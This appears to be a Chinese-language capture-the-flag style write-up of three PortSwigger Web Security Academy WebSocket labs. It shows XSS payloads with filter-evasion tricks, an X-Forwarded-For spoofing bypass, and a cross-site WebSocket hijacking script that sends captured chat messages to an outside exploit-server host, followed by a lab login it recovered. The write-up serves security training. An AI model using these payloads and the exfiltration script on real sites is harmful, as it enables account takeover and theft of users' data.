# WebSockets

[TOC]

## 1. Manipulating WebSocket messages to exploit vulnerabilities

使用了网络套接字的包好像只能拦截，在http history中看不到。

在chat.js里面看到，是先进行htmlEncode的，然后再发送，所以直接改就可以了。

```js
function sendMessage(data) {
    var object = {};
    data.forEach(function (value, key) {
        object[key] = htmlEncode(value);
    });

    webSocket.send(JSON.stringify(object));
}
```

将发送的东西改成这个，`{"message":"<script>alert(1)</script>"}`，然后刷新页面。

但是还是不行，想到script只在网页加载的时候执行，而这个请求对话是网页加载之后。

换成请求图片`{"message":"<img src='xxx' onerror='alert(1)'>"}`

可以了。

## 2. Manipulating the WebSocket handshake to exploit vulnerabilities

输入script之后对话被直接结束，访问`/chat`，返回了`"This address is blacklisted"`。尝试添加`X-Forwarded-For`头。发现有用。

```
X-Forwarded-For: 127.0.0.6
```

经过尝试，发现`<script>`被禁了，但是`<img>`没被禁。

但是输入`{"message":"<img src='xxx' onerror='alert(1)'>"}`却被禁止了。

```
{"message":"<img src='xxx' onerror >"}
```

上面这个可以，猜测是`alert`被禁止了。尝试大小写绕过。

```
{"message":"<img src='xxx' onerror=ALERt(1) >"}
```

不行。

试了一下，是`onerror=`被过滤了。

```
{"message":"<img src='xxx' onerror =1 >"}
```

这样可以，但是加上`alert(1)`就不行。猜测`alert(1)`也被过滤了。alert换成大写是无法执行的。

所以猜测是括号被过滤了。有下面两种绕过的方法。

```
<svg><script>alert&#40;1)</script>
<img src='xxx' onerror="javAScript:window.onerror =alert;throw 1">
```

但是第一种，script被过滤了。

尝试第二种。

```
{"message":"<img src='xxx' onerror ='javAScript:window.onerror =alert;throw 1' >"}
```

过了。

## 3. Cross-site WebSocket hijacking

这个题，直接建立WebSocket连接，`wss://ac611fda1f2718d980654b86009d00de.web-security-academy.net/chat`，然后给服务器发送`READY`，服务器就会把信息发回来。

```html
<script>
var webSocket = new WebSocket('wss://ac611fda1f2718d980654b86009d00de.web-security-academy.net/chat');
webSocket.onopen = start
webSocket.onmessage = handleReply
function start(event) {
  webSocket.send("READY");
}
function handleReply(event) {
  fetch('https://ac881fa71fcb182280bb4b9a017d0010.web-security-academy.net/exploit?'+event.data)
}
</script>
```

然后在log里面找到账号密码。

```
carlos:u75s66svxfv3s67g8jdo
```

登陆就好了。

